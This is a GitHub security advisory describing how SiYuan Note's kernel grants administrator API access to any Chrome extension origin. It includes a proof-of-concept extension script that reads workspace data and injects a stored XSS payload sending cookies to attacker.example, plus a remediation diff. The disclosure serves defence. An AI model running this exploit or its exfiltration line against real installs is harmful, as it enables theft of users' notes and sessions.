# [C] SiYuan: Unauthenticated Admin API Access via Blanket chrome-extension:// Origin Allowlist

## Summary
Severity: Critical
Advisory: GHSA-hvr9-72v2-fff3
CVE: CVE-2026-54069
CWE: CWE-346
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-hvr9-72v2-fff3
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260628153353-2d5d72223df4

## Details
## Summary

SiYuan Note's kernel HTTP server unconditionally trusts all `chrome-extension://` origins, granting `RoleAdministrator` access to every installed browser extension without any authentication. Combined with the default empty `AccessAuthCode` on desktop installs, any Chrome/Chromium extension -- including a compromised legitimate extension via supply chain attack -- can make fully authenticated admin API calls to the SiYuan kernel at `127.0.0.1:6806`, enabling data exfiltration, stored XSS injection, and configuration tampering.

## Affected Versions

SiYuan <= v3.6.5 (commit `96dfe0bea474`). The chrome-extension allowlist remains unfixed as of the latest commit on the fix branch (`d7b77d945e0d`).

## Vulnerability Details

### Blanket chrome-extension:// Origin Trust (CWE-346)

In `kernel/model/session.go:277`, the `CheckAuth` middleware exempts all `chrome-extension://` origins from authentication:

```go
if strings.HasPrefix(origin, "chrome-extension://") {
    // skip auth
}
```

At `session.go:284`, the request is assigned `RoleAdministrator`:

```go
c.Set("role", model.RoleAdministrator)
```

The `AccessAuthCode` field defaults to an empty string for desktop installs (`ContainerStd`). When empty, no token validation occurs. This means **any** Chrome/Chromium extension can make fully authenticated admin API calls to the SiYuan kernel.

The origin check trusts the entire `chrome-extension://` scheme rather than validating a specific extension ID, so every installed extension (including those with no explicit `host_permissions`) can access all admin endpoints.

## Proof of Concept

**Unauthenticated admin API access via browser extension:**

A minimal Chrome extension with only default permissions:

```json
{
  "manifest_version": 3,
  "name": "SiYuan PoC",
  "version": "1.0",
  "background": {
    "service_worker": "bg.js"
  }
}
```

```javascript
// bg.js -- runs as chrome-extension://<id>
// No special host_permissions needed; localhost is accessible by default

// 1. Verify admin access
fetch('http://127.0.0.1:6806/api/system/getConf', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: '{}'
}).then(r => r.json()).then(data => {
  console.log('[PoC] Admin API access confirmed:', data.code === 0);
});

// 2. Exfiltrate workspace data
fetch('http://127.0.0.1:6806/api/query/sql', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ stmt: 'SELECT * FROM blocks LIMIT 100' })
}).then(r => r.json()).then(data => {
  console.log('[PoC] Exfiltrated blocks:', data.data?.length);
});

// 3. Inject stored XSS payload into a note
fetch('http://127.0.0.1:6806/api/filetree/listDocsByPath', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ notebook: '', path: '/' })
}).then(r => r.json()).then(tree => {
  const firstDoc = tree.data?.files?.[0];
  if (!firstDoc) return;

  fetch('http://127.0.0.1:6806/api/block/insertBlock', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      dataType: 'markdown',
      data: '<img src=x onerror="fetch(\'https://attacker.example/steal?data=\'+document.cookie)">',
      parentID: firstDoc.id
    })
  });
});
```

The extension requires zero special permissions. The `chrome-extension://` origin header is automatically sent by the browser, and `session.go:277` grants it `RoleAdministrator` without any token check.

## Impact

- **Unauthenticated admin API access** for any installed browser extension, enabling full control of the SiYuan kernel
- **Data exfiltration** of the entire workspace via `/api/query/sql`, `/api/filetree/`, `/api/export/`
- **Stored XSS injection** via admin API endpoints (`/api/block/insertBlock`, `/api/attr/setBlockAttrs`), persisted in the user's notes
- **Configuration tampering** via `/api/system/setConf`, enabling persistence and further attack surface expansion
- **Supply chain amplification**: a single compromised popular Chrome extension update can silently exploit every SiYuan desktop user

## Suggested Remediation

**Remove blanket chrome-extension:// allowlist:**

```diff
--- a/kernel/model/session.go
+++ b/kernel/model/session.go
@@ -274,9 +274,6 @@
 func CheckAuth(c *gin.Context) {
     origin := c.GetHeader("Origin")
-    if strings.HasPrefix(origin, "chrome-extension://") {
-        // Allow chrome extension requests
-    } else
     if !isValidOrigin(origin) {
         c.AbortWithStatusJSON(401, gin.H{"code": -1, "msg": "invalid origin"})
         return
```

If extension access is required, implement a per-session token exchange: the SiYuan UI generates a random token on startup, and the extension must present it via a dedicated pairing endpoint. This ensures only explicitly authorized extensions can access the API.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-hvr9-72v2-fff3
- https://nvd.nist.gov/vuln/detail/CVE-2026-54069
- https://github.com/siyuan-note/siyuan
